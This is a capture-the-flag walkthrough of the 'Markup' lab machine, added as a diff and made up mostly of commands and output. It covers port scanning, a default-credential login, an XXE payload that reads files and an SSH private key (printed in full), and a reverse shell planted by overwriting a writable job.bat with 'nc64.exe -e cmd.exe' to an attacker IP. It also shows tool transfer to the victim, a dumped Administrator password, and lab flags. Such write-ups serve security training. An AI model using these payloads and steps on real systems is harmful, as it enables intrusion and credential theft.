@@ -1,0 +1,184 @@
+Markup Lab: Vulnerabilities: Weak login credentials, XML injection (XEE vulnerability), insecure permissions 
+
+Enumeration:
+
+sudo nmap -sC -sV -p- --min-rate=1000 -vv 10.129.90.186
+
+PORT    STATE SERVICE  REASON          VERSION
+22/tcp  open  ssh      syn-ack ttl 127 OpenSSH for_Windows_8.1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJ6igORqDgM0+6P4dUx3DcDJyuzMMRkDabKsdcrizRtEKleaaYjmgCbwyhD+JqwIX2AZqoC0MLH0q37YJzp3aegjEW9Q0dUBQGSoRRe8wWmsHRFbxgaoGunpB5VK4p3KE2MPVJXUkTSW2Mdrq4yWb63HnNF4TSIPk/+U5e99Qlrgmn0IeJrn9jkRBjPjLq1HSL0zY4YTO5qnvUktZ8J0Y19YVkYfZoLXJeTtiUKEXJYIUog8oUq9M8+1rUHU/GTjdU5X+jNExqvWm15fXr42Of2hnKP8ZRjyynWZ9hPAQjmCHCxh0Mvn/fWCsJ2nri/3SOULiwEfG9XULbLX0tABz++ujmiRyOZoPDscazFzxqfofiJhRm4cxiYf1p2pfjITfWGpxOUxOYDawXT10fLjo7hjpDqy6pKuK3TGbBx5VVG9p1szrctN9XpnI2bmpTMix3ISqddFgTHJimyb5TrcWZ876igSAPx0GtVOZqAk4ae1xh/qutG/PONnVQWcwZQLU=
+|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPnBLEC67Ty1ccuPW0DPWevSQAIg39y1jbSVLmegQkZ3vCooq0wheIffYyBhRnAAJj6Fi1jpTxP7u6H8JAqyGjU=
+|   256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAID9o7yWjLL4g6Gu71UeLZB+kbmzW+cp0eiRtb21D1JZC
+80/tcp  open  http     syn-ack ttl 127 Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
+|_http-title: MegaShopping
+443/tcp open  ssl/http syn-ack ttl 127 Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
+| tls-alpn: 
+|_  http/1.1
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_ssl-date: TLS randomness does not represent time
+|_http-title: MegaShopping
+| ssl-cert: Subject: commonName=localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2009-11-10T23:48:47
+| Not valid after:  2019-11-08T23:48:47
+| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
+| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
+
+This takes me to a login page when I access the HTTP server
+
+By luck I tried using default credentials and was able to get in:
+Username: admin
+Password: password
+
+We found a tab “Order” that allows us to submit information on the HTML document when you inspect the source. We see that this HTTP server runs on xml 1.0
+
+We can also find it on burpe suite when we send a request over
+
+Once burpe suite sends the xml request from “order” tab, we can manipulate the xml to leak more information
+https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity 
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
+<order>
+<quantity>
+3
+</quantity>
+<item>
+&test;
+</item>
+<address>
+17th Estate, CA
+</address>
+</order>
+
+The output of the win.ini file on the target itself is displayed in our response message, which proves that the XML External Entity vulnerability is present.
+
+Using inspect element, we found daniel was a user, as he was mentioned on the HTMl document, so we searched for his ssh key when we found out XEE existed. 
+
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>
+
+Output:
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+
+
+We placed this into a file called id_rsa
+touch id_rsa
+sudo nano id_rsa
+Copy and paste that above in, starting at START OPENSSH to END OPENSSH
+ssh -i id_rsa daniel@10.129.90.186
+
+daniel@MARKUP C:\Users\daniel\Desktop>type user.txt 
+032d2fc8952a8c24e39c8f0ee9918ef7
+
+Check privileges on windows server:
+
+whoami /priv
+
+daniel@MARKUP C:\Log-Management>icacls job.bat
+job.bat BUILTIN\Users:(F)
+        NT AUTHORITY\SYSTEM:(I)(F)
+        BUILTIN\Administrators:(I)(F)
+        BUILTIN\Users:(I)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+
+We can exploit this, let’s see if we can get a reverse shell. 
+
+We need to transmit this nc windows version over to the victim PC, as the server runs on windows.
+wget https://github.com/rahuldottech/netcat-for-windows/releases/download/1.12/nc64.exe
+
+Launch HTTP server so victim can reach to get nc64
+sudo python3 -m http.server 8000
+
+
+On the victim terminal:
+wget http://10.10.14.16:8000/nc64.exe -outfile nc64.exe
+
+echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.14.6 9000 > C:\Log-Management\job.bat
+
+On attack machine:
+nc -lvnp 9000
+
+We now have root access
+
+Additional:
+
+On attack machine:
+Wget https://github.com/peass-ng/PEASS-ng/releases/download/20240630-b2cfbe8a/winPEASx64.exe 
+
+sudo python3 -m http.server 8000
+
+On Victim machine:
+wget http://10.10.14.6:8000/winPEASx64.exe -outfile winPEASx64.exe
+.\winPEASx64.exe
+
+For the output, we found something under:
++----------¦ Looking for AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultUserName               :  Administrator
+    DefaultPassword               :  Yhk}QE&j<3M
+
+
+ssh Administrator@10.129.90.186
+
+
+Another way for root access to get the flag!
+administrator@MARKUP C:\Users\Administrator\Desktop>type root.txt
+f574a3e7650cebd8c39784299cb570f8 
